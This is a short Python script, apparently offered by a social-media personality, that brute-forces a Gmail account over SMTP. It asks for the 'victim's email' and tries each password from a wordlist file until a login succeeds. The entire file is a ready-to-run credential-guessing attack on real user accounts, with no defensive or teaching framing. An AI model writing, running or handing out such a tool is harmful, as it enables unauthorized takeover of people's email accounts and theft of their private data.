import smtplib
 
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

print("\033[2J\033[1;1f")

print("\033[4;35;47m"+"    =============================              "+'\033[0;m')
print("\033[;36m"+"         = ❤️❤️❤️❤️❤️   G M A I L   ❤️❤️❤️❤️❤️ =             ")
print("\033[4;35;47m"+"    =============================              "+'\033[0;m \n')
print(" ★  ✈️👣👉https://www.instagram.com/ssh.var")
print(" ★  ✈️👣👉https://www.facebook.com/ssh.var")
print("    ★  ✈️👣👉https://tiktok.com/@ssh.var")
print("     ★  ✈️👣👉https://github.com/Sshvar\n")
email = input("\n \033[1;33m"+"👿Email de la Victima👿👉:" +'\033[0;m')
dic = open("./BrutalPassword.txt", "r")

 
for pwd in dic:
    
    try:
        smtpserver.login(email, pwd)
        print("Password Correcta: %s"  % pwd)
        break;
    except smtplib.SMTPAuthenticationError:
        print("smtp.gmail.com»»»»»»Password Incorrecta: %s" % pwd)
